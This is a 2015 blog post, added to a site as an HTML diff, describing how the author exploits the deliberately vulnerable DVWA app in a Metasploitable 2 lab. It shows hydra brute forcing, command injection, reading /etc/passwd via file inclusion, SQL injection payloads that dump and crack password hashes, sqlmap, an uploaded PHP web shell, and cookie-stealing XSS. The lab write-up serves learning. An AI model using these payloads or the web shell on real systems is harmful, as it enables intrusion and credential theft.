@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+
+  
+  <link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <title>Exploring Damn Vulnerable Web Application</title>
+
+  
+  
+  <link rel="stylesheet" href="http://mislusnys.github.io/css/hugo-octopress.css">
+
+  
+  
+
+  
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  
+
+  
+  <link href="http://mislusnys.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+
+  
+
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+
+  <meta name="author" content="Mindaugas Slusnys">
+
+  
+  <meta name="generator" content="Hugo 0.15" />
+
+  
+  
+
+</head>
+<body>
+
+
+<header role="banner"><hgroup>
+  
+  <h1><a href="http://mislusnys.github.io/">InfoSec and Stuff</a></h1>
+    <h2></h2>
+</hgroup></header>
+
+
+<nav role="navigation">
+
+
+<ul class="main-navigation">
+  
+  
+    
+      <li><a href="http://mislusnys.github.io/" title="Blog">Blog</a></li>
+    
+  
+    
+      <li><a href="http://mislusnys.github.io/archive/" target="_blank" title="Archive">Archive</a></li>
+    
+  
+</ul>
+
+
+<ul class="subscription">
+  
+
+  
+  
+
+</ul>
+
+
+<form action="https://www.google.com/search" method="get" target="_blank">
+  <fieldset role="search">
+  	<input class="search" type="text" name="q" results="0" placeholder="Search"/>
+    <input type="hidden" name="q" value="site:http://mislusnys.github.io/" />
+  </fieldset>
+</form>
+
+</nav>
+
+
+<div id="main">
+  <div id="content">
+    <div>
+      <article class="hentry" role="article">
+        <header>
+          <h1 class="entry-title">
+            Exploring Damn Vulnerable Web Application 
+          </h1>
+          <p class="meta">Feb 2, 2015 - 6 minute read - 
+
+          
+
+          
+          
+          <a class="label" href="http://mislusnys.github.io/categories/pentest">pentest</a><a class="label" href="http://mislusnys.github.io/categories/web">web</a>
+          </p>
+        </header>
+        <div class="entry-content">
+          
+          
+          
+          
+
+<h2 id="intro:a278ed06f786dfe478032a0f72deba1a">Intro</h2>
+
+<p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p>
+
+<p>In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
+We will use the version that is bundled in the <a href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable 2</a> VM.
+We will use the lowest security setting (<em>PHPIDS:disabled</em> and <em>Security Level:low</em>).</p>
+
+<h2 id="1-brute-force:a278ed06f786dfe478032a0f72deba1a">1. Brute Force</h2>
+
+<p>Our first task is to brute force HTTP based login form:</p>
+
+<p><img src="/images/bf.png" alt="Brute Force" /></p>
+
+<p>Using <code>burp</code> we find that parameters are transmitted via URL:</p>
+
+<p><code>http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&amp;password=test&amp;Login=Login#</code></p>
+
+<p>And our session data:</p>
+
+<p><code>Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28</code></p>
+
+<p>Using this information we can use <code>hydra</code> to brute force the login form:</p>
+
+
+
+<figure class="code">
+  <figcaption>
+  	<span>Hydra bruteforce</span>
+  </figcaption>
+  <div class="codewrapper">
+    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
+2
+3
+4
+5
+6
+7
+8
+9</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form &quot;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&quot;
+Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
+[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
+[DATA] attacking service http-get-form on port 80
+[80][www-form] host: 192.168.52.129   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57
+</pre></div>
+</td></tr></table>
+  </div>
+</figure>
+
+
+<p>We found valid login credentials: <code>admin:password</code></p>
+
+<h2 id="2-command-execution:a278ed06f786dfe478032a0f72deba1a">2. Command Execution</h2>
+
+<p><img src="/images/ce.png" alt="Command Execution" /></p>
+
+<p>This part of the app gives the current user the ability to ping a host.
+However it uses a vulnerable piece of code:</p>
+
+<p><code>$cmd = shell_exec( 'ping  -c 3 ' . $target );</code></p>
+
+<p>Since we control the <code>$target</code> variable, we can use <code>;</code> or <code>||</code> to stack commands.</p>
+
+<p>Using <code>127.0.0.1;ls -al</code> as input we get:</p>
+
+<pre><code>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
+total 20
+drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
+drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
+drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
+-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
+drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
+</code></pre>
+
+<h2 id="3-cross-site-request-forgery:a278ed06f786dfe478032a0f72deba1a">3. Cross Site Request Forgery</h2>
+
+<p><img src="/images/csrf.png" alt="CSRF" /></p>
+
+<p>CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
+In our case the password change operation results in the following request:</p>
+
+<p><code>http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</code></p>
+
+<p>If we can trick an authenticated user to make this request, we can change this user&rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside <code>img</code>, <code>iframe</code> tags or inside malicious javascript code.</p>
+
+<h2 id="4-file-inclusion:a278ed06f786dfe478032a0f72deba1a">4. File Inclusion</h2>
+
+<p><img src="/images/fi.png" alt="File Inclusion" /></p>
+
+<p>This one is pretty straight forward. We can change the <code>page</code> variable to display sensitive information:</p>
+
+<p><code>http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd</code></p>
+
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
+bin:x:2:2:bin:/bin:/bin/sh 
+sys:x:3:3:sys:/dev:/bin/sh 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/bin/sh 
+man:x:6:12:man:/var/cache/man:/bin/sh 
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
+mail:x:8:8:mail:/var/mail:/bin/sh 
+news:x:9:9:news:/var/spool/news:/bin/sh 
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
+proxy:x:13:13:proxy:/bin:/bin/sh 
+www-data:x:33:33:www-data:/var/www:/bin/sh 
+backup:x:34:34:backup:/var/backups:/bin/sh 
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
+dhcp:x:101:102::/nonexistent:/bin/false 
+syslog:x:102:103::/home/syslog:/bin/false 
+klog:x:103:104::/home/klog:/bin/false 
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
+bind:x:105:113::/var/cache/bind:/bin/false 
+postfix:x:106:115::/var/spool/postfix:/bin/false 
+ftp:x:107:65534::/home/ftp:/bin/false 
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
+distccd:x:111:65534::/:/bin/false 
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
+service:x:1002:1002:,,,:/home/service:/bin/bash 
+telnetd:x:112:120::/nonexistent:/bin/false 
+proftpd:x:113:65534::/var/run/proftpd:/bin/false 
+statd:x:114:65534::/var/lib/nfs:/bin/false 
+snmp:x:115:65534::/var/lib/snmp:/bin/false 
+</code></pre>
+
+<h2 id="5-1-sql-injection:a278ed06f786dfe478032a0f72deba1a">5.1 SQL Injection</h2>
+
+<p><img src="/images/sqli.png" alt="SQLI" /></p>
+
+<p>User input is unfiltered and used in the following query:</p>
+
+<p><code>SELECT first_name, last_name FROM users WHERE user_id = '$id'</code></p>
+
+<p>If we enter <code>' or 1=1-- -</code> as an id then the query becomes:</p>
+
+<p><code>SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1</code></p>
+
+<p>which makes WHERE clause always true and shows us all the records:</p>
+
+<pre><code>ID: 'or 1=1-- -
+First name: admin
+Surname: admin
+
+ID: 'or 1=1-- -
+First name: Gordon
+Surname: Brown
+
+ID: 'or 1=1-- -
+First name: Hack
+Surname: Me
+
+ID: 'or 1=1-- -
+First name: Pablo
+Surname: Picasso
+
+ID: 'or 1=1-- -
+First name: Bob
+Surname: Smith
+</code></pre>
+
+<p>Using <code>UNION</code> keyword we can extract any information available to the app&rsquo;s user from the database.
+<code>' union select database(),null -- -</code></p>
+
+<pre><code>ID: ' union select database(),null -- -
+First name: dvwa
+Surname: 
+</code></pre>
+
+<p><code>' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -</code></p>
+
+<pre><code>ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
+First name: guestbook
+Surname: 
+
+ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
+First name: users
+Surname: 
+
+</code></pre>
+
+<p><code>' union select column_name,null from information_schema.columns where table_name='users'-- -</code></p>
+
+<pre><code>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: user_id
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: first_name
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: last_name
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: user
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: password
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: avatar
+Surname: 
+</code></pre>
+
+<p><code>' union select user, password from users-- -</code></p>
+
+<pre><code>ID: ' union select user, password from users-- -
+First name: admin
+Surname: 098f6bcd4621d373cade4e832627b4f6
+
+ID: ' union select user, password from users-- -
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+ID: ' union select user, password from users-- -
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+ID: ' union select user, password from users-- -
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+ID: ' union select user, password from users-- -
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
+
+<p>Looks like the passwords are MD5 hashed. However, they are easily found to be <code>test</code>, <code>abc123</code>, <code>charley</code>, <code>letmein</code> and <code>password</code> respectively.</p>
+
+<h2 id="5-2-sql-injection-blind:a278ed06f786dfe478032a0f72deba1a">5.2 SQL Injection(Blind)</h2>
+
+<p>The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
+We can use <code>sqlmap</code> to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)</p>
+
+
+
+<figure class="code">
+  <figcaption>
+  	<span>SQLMap Table Dump</span>
+  </figcaption>
+  <div class="codewrapper">
+    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">sqlmap -u &quot;http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&quot; --dump
+
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+| user_id | user    | avatar                                                | password                         | last_name | first_name |
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+| 1       | admin   | http://192.168.52.129/dvwa/hackable/users/admin.jpg   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
+| 2       | gordonb | http://192.168.52.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
+| 3       | 1337    | http://192.168.52.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
+| 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
+| 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+</pre></div>
+</td></tr></table>
+  </div>
+</figure>
+
+
+<h2 id="6-file-upload:a278ed06f786dfe478032a0f72deba1a">6. File Upload</h2>
+
+<p><img src="/images/up.png" alt="File Upload" /></p>
+
+<p>On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:</p>
+
+<p>
+
+<figure class="code">
+  <figcaption>
+  	<span>PHP Shell</span>
+  </figcaption>
+  <div class="codewrapper">
+    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;?php</span>
+<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(isset($_REQUEST[</span><span style="color: #e6db74">&#39;cmd&#39;</span><span style="color: #f8f8f2">])){</span>
+    <span style="color: #f8f8f2">$cmd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">($_REQUEST[</span><span style="color: #e6db74">&quot;cmd&quot;</span><span style="color: #f8f8f2">]);</span>
+    <span style="color: #f8f8f2">system($cmd);</span>
+    <span style="color: #66d9ef">echo</span> <span style="color: #e6db74">&quot;&lt;/pre&gt;$cmd&lt;pre&gt;&quot;</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #66d9ef">die</span><span style="color: #f8f8f2">;</span>
+<span style="color: #f8f8f2">}</span>
+<span style="color: #75715e">?&gt;</span>
+</pre></div>
+</td></tr></table>
+  </div>
+</figure>
+</p>
+
+<p><code>../../hackable/uploads/shell.php succesfully uploaded!</code></p>
+
+<p>We can execute commands now via this shell:</p>
+
+<p><code>http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al</code></p>
+
+<h2 id="7-1-reflected-xss:a278ed06f786dfe478032a0f72deba1a">7.1 Reflected XSS</h2>
+
+<p><img src="/images/xss.png" alt="XSS" /></p>
+
+<p>Here whatever we enter gets included into page source.</p>
+
+<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+
+<p><img src="/images/cookie.png" alt="Cookie" /></p>
+
+<h2 id="7-2-stored-xss:a278ed06f786dfe478032a0f72deba1a">7.2 Stored XSS</h2>
+
+<p><img src="/images/xss2.png" alt="XSS" /></p>
+
+<p>Here the app is vulnerable to XSS again. However, this time the injected code is stored inside the database and is executed every time somebody visits the guestbook page.</p>
+
+<p><img src="/images/stored.png" alt="Stored XSS" /></p>
+
+<h2 id="summary:a278ed06f786dfe478032a0f72deba1a">Summary</h2>
+
+<p>DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo.</p>
+
+        </div>
+        
+
+<footer>
+  <p class="meta">
+    <span class="byline author vcard">Posted by <span class="fn">Mindaugas Slusnys</span></span>
+    
+    <time>Feb 2, 2015</time>
+    <span class="categories">
+      Tags:
+        
+        
+          <a class="category" href="http://mislusnys.github.io/tags/dvwa">dvwa</a>  <a class="category" href="http://mislusnys.github.io/tags/php">php</a>  <a class="category" href="http://mislusnys.github.io/tags/mysql">mysql</a>  
+        
+    </span>
+  </p>
+
+  
+  
+
+  
+
+  <p class="meta">
+    
+
+    
+      <a class="basic-alignment right" href="http://mislusnys.github.io/2015/02/03/owasp-top-10-in-mutillidae/" title="OWASP Top 10 in Mutillidae (Part1)">OWASP Top 10 in Mutillidae (Part1)</a>
+    
+  </p>
+  
+</footer>
+
+      </article>
+    </div>
+    
+
+
+<aside class="sidebar thirds">
+  <section class="first odd">
+
+    
+      <h1>About</h1>
+    
+
+    <p>
+      
+        I am interested in infosec, reverse engineering and finding bugs. <br> <br> Sometimes, I write things down - to learn them better. <br> <br> Get a hold of me - slusnys dot mindaugas at gmail dot com
+      
+    </p>
+  </section>
+
+  
+
+
+
+  <ul class="sidebar-nav">
+    <li class="sidebar-nav-item">
+      
+      
+      
+       
+      
+      
+      
+      
+      
+
+    
+    
+    </li>
+  </ul>
+
+  
+  <section class="even">
+    <h1>Recent Posts</h1>
+
+    
+    <ul id="recent_posts">
+      
+      
+        
+      
+      
+      <li class="post">
+        <a href="/2015/02/06/owasp-top-10-in-mutillidae-part-2/">OWASP Top 10 in Mutillidae (Part2)</a>
+      </li>
+      
+      <li class="post">
+        <a href="/2015/02/03/owasp-top-10-in-mutillidae/">OWASP Top 10 in Mutillidae (Part1)</a>
+      </li>
+      
+      <li class="post">
+        <a href="/2015/02/02/damn-vulnerable-web-application/">Exploring Damn Vulnerable Web Application</a>
+      </li>
+      
+      <li class="post">
+        <a href="/archive/">All Posts</a>
+      </li>
+      
+    </ul>
+  </section>
+
+</aside>
+
+  </div>
+</div>
+
+
+
+
+<footer role="contentinfo">
+  <p>Copyright &copy; 2016 Mindaugas Slusnys . 
+  <span class="credit">Powered by <a target="_blank" href="https://gohugo.io">Hugo</a> and <a target="_blank" href="https://github.com/parsiya/hugo-octopress/">Hugo-Octopress</a> theme.
+</p>
+
+</footer>
+
+
+</body>
+</html>
+
